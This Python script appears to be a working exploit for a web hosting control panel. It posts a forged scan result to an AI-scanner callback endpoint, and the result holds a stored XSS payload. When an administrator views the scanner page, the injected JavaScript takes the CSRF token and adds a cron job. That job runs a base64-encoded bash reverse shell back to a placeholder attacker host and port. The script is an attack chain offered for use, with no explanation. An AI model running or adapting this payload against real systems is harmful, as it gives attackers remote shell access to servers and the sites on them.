#!/usr/bin/env python3

import requests
import base64
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

TARGET = "TARGET_URL"
ATTACKER_IP = "ATTACKER_IP"
ATTACKER_PORT = "ATTACKER_PORT"

cmd = f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"
cmd_b64 = base64.b64encode(cmd.encode()).decode()
cron_command = f"echo {cmd_b64}|base64 -d|bash"

print(f"[*] Cron command: {cron_command}")

js_code = f"""
var t="{TARGET}";
fetch("/websites/fetchWebsitesList",{{
    method:"POST",
    headers:{{
        "Content-Type":"application/json",
        "X-CSRFToken":document.cookie.match(/csrftoken=([^;]+)/)[1]
    }},
    body:JSON.stringify({{page:1,recordsToShow:10}})
}})
.then(r=>r.json())
.then(d=>{{
    if(d.listWebSiteStatus===1){{
        var s=JSON.parse(d.data);
        if(s.length>0){{
            fetch("/websites/addNewCron",{{
                method:"POST",
                headers:{{
                    "Content-Type":"application/json",
                    "X-CSRFToken":document.cookie.match(/csrftoken=([^;]+)/)[1],
                    "Referer":t+"/websites/listCron"
                }},
                body:JSON.stringify({{
                    domain:s[0].domain,
                    minute:"*",hour:"*",monthday:"*",month:"*",weekday:"*",
                    cronCommand:"{cron_command}"
                }})
            }});
        }}
    }}
}});
""".replace('\n', ' ').strip()

xss = f"<img src=x onerror='{js_code}'>"

url = f"{TARGET}/api/ai-scanner/callback"
scan_id = "SCAN_ID"

data = {
    "scan_id": scan_id,
    "status": "completed",
    "summary": {
        "threat_level": "CRITICAL",
        "total_findings": 1,
        "files_scanned": 10,
        "cost": "$0.00"
    },
    "findings": [{
        "file_path": "/var/www/html/test.php",
        "severity": "critical",
        "title": f"POC {xss}",
        "description": "shell",
        "ai_confidence": 95
    }],
    "ai_analysis": "Test"
}

print(f"\n[*] Sending to {url}")
print(f"[*] Scan ID: {scan_id}")

try:
    r = requests.post(url, json=data, verify=False, timeout=10)
    print(f"\n[*] Response code: {r.status_code}")
    print(f"[*] Response body: {r.text[:500]}")
    
    if r.status_code == 200:
        print(f"\n[+] SUCCESS - Payload injected")
        print(f"[*] Now view: {TARGET}/aiscanner/")
    else:
        print(f"\n[-] FAILED - Status: {r.status_code}")
        
except Exception as e:
    print(f"\n[-] ERROR: {e}")
    import traceback
    traceback.print_exc()
